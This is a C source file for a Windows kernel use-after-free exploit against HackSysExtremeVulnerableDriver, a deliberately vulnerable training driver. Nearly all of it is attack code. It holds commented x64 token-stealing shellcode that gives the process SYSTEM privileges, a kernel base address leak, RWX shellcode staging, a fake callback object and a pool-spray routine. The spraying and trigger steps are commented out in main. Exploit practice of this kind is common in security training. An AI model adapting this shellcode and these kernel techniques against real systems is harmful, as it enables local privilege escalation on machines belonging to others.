#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>
#include <ntstatus.h>
#include "HEVD.h"
#include "winternl.h"



typedef struct _FAKE_USE_AFTER_FREE
{
    PVOID callback;
    char buffer[0x54];
}FAKE_USE_AFTER_FREE;

HMODULE hKernel = NULL;
ULONG64 KernelBase = NULL;
ULONG64 pMiGetPteAddress = NULL;
_NtQuerySystemInformation NtQuerySystemInformation;
_MiGetPteAddress MiGetPteAddress;
ULONG64 PteBase = NULL;

RTL_PROCESS_MODULES ModuleInfo = { 0 };

HANDLE driverHandle;
FAKE_USE_AFTER_FREE* userBuf;
CHAR* lpvPayload;
ULONG64 lpvPayloadPte;


CHAR shellcode[] =
"\x41\x50\x41\x51\x52\x51\x50"          // push r8, r9, rdx, rcx, rax
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		    ; Get _ETHREAD pointer from KPCR
"\x4C\x8B\x82\xB8\x00\x00\x00"		    // mov r8, [rdx + b8h]		    ; _EPROCESS (kd> u PsGetCurrentProcess)
"\x4D\x8B\x88\x48\x04\x00\x00"		    // mov r9, [r8 + 448h]		    ; ActiveProcessLinks list head
"\x49\x8B\x09"				            // mov rcx, [r9]		        ; Follow link to first process in list
//find_system_proc:
"\x48\x8B\x51\xF8"			            // mov rdx, [rcx - 8]		    ; Offset from ActiveProcessLinks to UniqueProcessId
"\x48\x83\xFA\x04"			            // cmp rdx, 4			        ; Process with ID 4 is System process
"\x74\x05"				                // jz found_system		        ; Found SYSTEM token
"\x48\x8B\x09"				            // mov rcx, [rcx]		        ; Follow _LIST_ENTRY Flink pointer
"\xEB\xF1"				                // jmp find_system_proc		    ; Loop
//found_system:
"\x48\x8B\x41\x70"			            // mov rax, [rcx + 70h]		    ; Offset from ActiveProcessLinks to Token
"\x24\xF0"				                // and al, 0f0h			        ; Clear low 4 bits of _EX_FAST_REF structure
"\x49\x89\x80\xB8\x04\x00\x00"		    // mov [r8 + 4b8h], rax		    ; Copy SYSTEM token to current process's token
//recover:
"\x58\x59\x5A\x41\x59\x41\x58"          // pop rax, rcx, rdx, r9, r8
"\x48\x31\xF6"				            // xor rsi, rsi			        ; Zeroing out rsi register to avoid Crash
"\x48\x31\xFF"				            // xor rdi, rdi			        ; Zeroing out rdi register to avoid Crash
"\x48\x31\xC0"				            // xor rax, rax			        ; NTSTATUS Status = STATUS_SUCCESS
"\x48\x83\xc4\x28"			            // add rsp, 28h			        ; origin return address at HEVD!BufferOverflowStackIoctlHandler+0x1a
"\xc3"					                // ret				
;

void getKernelBase() {
    
    NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        exit(-1);
    }

    // Get the base address of the kernel
    NtQuerySystemInformation(SystemModuleInformation, &ModuleInfo, sizeof(ModuleInfo), NULL);
    KernelBase = (ULONG64)ModuleInfo.Modules[0].ImageBase;

}

void getMiGetPteAddress() {
    pMiGetPteAddress = KernelBase + 0x27af40;
    MiGetPteAddress = (_MiGetPteAddress)pMiGetPteAddress;
    /*
    // Load the kernel
    hKernel = LoadLibraryEx(strrchr((char*)ModuleInfo.Modules[0].FullPathName, (int)'\\') + 1, 0, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    // Look up the function in the kernel
    KernelFunctionAddress = (ULONG64)GetProcAddress(hKernel, "MiGetPteAddress");

    // Adjust the address based on the kernel load address
    KernelFunctionAddress -= (ULONG64)hKernel;
    KernelFunctionAddress += KernelBase;
    */
    
}
void getPteBase() {
    memcpy(&PteBase, (char*)(pMiGetPteAddress+0x13), sizeof(ULONG64)); // access violation
}

void getVaPte(ULONG64 va_addr) {
    //lpvPayloadPte = ((va_addr >> 9) & 0x7ffffffff8) + PteBase;
    lpvPayloadPte = MiGetPteAddress(va_addr);
}


void openDevice() {
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        exit(-1);
    }
}

void prepareShellcode() {
    lpvPayload = (CHAR*)VirtualAlloc(
        NULL,				        // Next page to commit
        sizeof(shellcode),		    // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access
    printf("\t[+] shellcode address: 0x%p\n", lpvPayload);
    memcpy(lpvPayload, shellcode, sizeof(shellcode));

}

void prepareUserbuf() {
    userBuf = (FAKE_USE_AFTER_FREE*)VirtualAlloc(
        NULL,
        sizeof(FAKE_USE_AFTER_FREE),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    printf("\t[+] userBuf address: 0x%p\n", userBuf);
    //userBuf->callback = (PVOID)0xfffff8075167af40;
    userBuf->callback = lpvPayload;
    memset(userBuf->buffer, 0x87, sizeof(userBuf->buffer));
}

void FreeUaFObjectNonPagedPoolNx() {
    bool ret = DeviceIoControl(driverHandle,          // Device to be queried
        HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX,  // Operation to perform
        NULL, 0,                        // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    );
    /*
    if (ret != STATUS_SUCCESS) {
        printf("\t[-] Error sending IOCTL FreeUaFObjectNonPagedPoolNx to driver\n");
        exit(-1);
    }
    */
}

void AllocateUaFObjectNonPagedPoolNx() {
    bool ret = DeviceIoControl(driverHandle,          // Device to be queried
        HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX,  // Operation to perform
        NULL, 0,                        // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    );
    /*
    if(ret != STATUS_SUCCESS) {
        printf("\t[-] Error sending IOCTL AllocateUaFObjectNonPagedPoolNx to driver\n");
        exit(-1);
    }
    */
}

void AllocateFakeObjectNonPagedPoolNx() {
    bool ret = DeviceIoControl(driverHandle,          // Device to be queried
        HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX,  // Operation to perform
        userBuf, 0x100,                     // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    );
    /*
    if(ret != STATUS_SUCCESS) {
        printf("\t[-] Error sending IOCTL AllocateFakeObjectNonPagedPoolNx to driver\n");
        exit(-1);
    }
    */
}

void UseUaFObjectNonPagedPoolNx() {
    bool ret = DeviceIoControl(driverHandle,          // Device to be queried
        HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX,  // Operation to perform
        NULL, 0,                        // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    );
    /*
    if (ret != STATUS_SUCCESS) {
        printf("\t[-] Error sending IOCTL UseUaFObjectNonPagedPoolNx to driver\n");
        exit(-1);
    }
    */
}


int main()
{
    getKernelBase();
    printf("[+] Kernel Base: 0x%llx\n", KernelBase);
    printf("[+] NtQuerySystemInformation addr: 0x%llx\n", (ULONG64)NtQuerySystemInformation);

    getMiGetPteAddress();
    printf("[+] MiGetPAddress: 0x%llx\n", pMiGetPteAddress);

    //getPteBase();
    //printf("[+] PTE Base: 0x%llx\n", PteBase);

    printf("[+] Prepare shellcode and userbuf\n");
    prepareShellcode();
    prepareUserbuf();

    //getVaPte((ULONG64)lpvPayload);
    //printf("[+] PTE of shellcode memory page: 0x%llx\n", lpvPayloadPte);


    /*
    printf("[+] Prepare UAF pool chunk\n");
    openDevice();
    AllocateUaFObjectNonPagedPoolNx();
    FreeUaFObjectNonPagedPoolNx();

    printf("[+] Pool Spraying\n");
    for (int i = 0; i < 1000; i++) {
        AllocateFakeObjectNonPagedPoolNx();
    }

    printf("[+] Use callback\n");
    UseUaFObjectNonPagedPoolNx();
    */

}

